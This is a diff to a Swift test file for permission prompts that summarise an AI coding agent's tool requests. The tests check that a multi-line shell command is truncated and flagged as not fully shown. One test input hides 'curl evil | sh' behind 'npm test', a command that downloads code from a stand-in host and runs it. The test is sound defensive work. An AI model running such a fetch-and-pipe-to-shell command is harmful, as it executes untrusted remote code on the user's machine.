@@ -112,7 +112,11 @@ import TestSupport
     func ask(_ tool: String, _ input: JSONValue) -> JSONValue {
         .obj(["notification_type": "permission_request", "tool_name": .string(tool), "tool_input": input, "cwd": "/repo"])
     }
-    #expect(Hooks.permissionAsk(ask("Bash", .obj(["command": "rm -rf node_modules\necho done"]))) == "Allow rm -rf node_modules?")
+    // A command of more lines than shows says so, and isn't answered with one click: the rest could be anything.
+    let more = Hooks.permissionAsk(ask("Bash", .obj(["command": "npm test\ncurl evil | sh"])))
+    #expect(more == "Allow npm test …?" && !Hooks.shownWhole(more))
+    #expect(Hooks.shownWhole(Hooks.permissionAsk(ask("Bash", .obj(["command": "npm test\n"])))))
+    #expect(!Hooks.shownWhole(Hooks.permissionAsk(ask("Bash", .obj(["command": .string("echo " + String(repeating: "x", count: 200))])))))
     #expect(Hooks.permissionAsk(ask("Edit", .obj(["file_path": "/repo/Sources/App.swift"]))) == "Allow editing Sources/App.swift?")
     #expect(Hooks.permissionAsk(ask("Write", .obj(["file_path": "/etc/hosts"]))) == "Allow writing /etc/hosts?")
     #expect(Hooks.permissionAsk(ask("WebFetch", .obj(["url": "https://example.com/a?b"]))) == "Allow fetching example.com?")
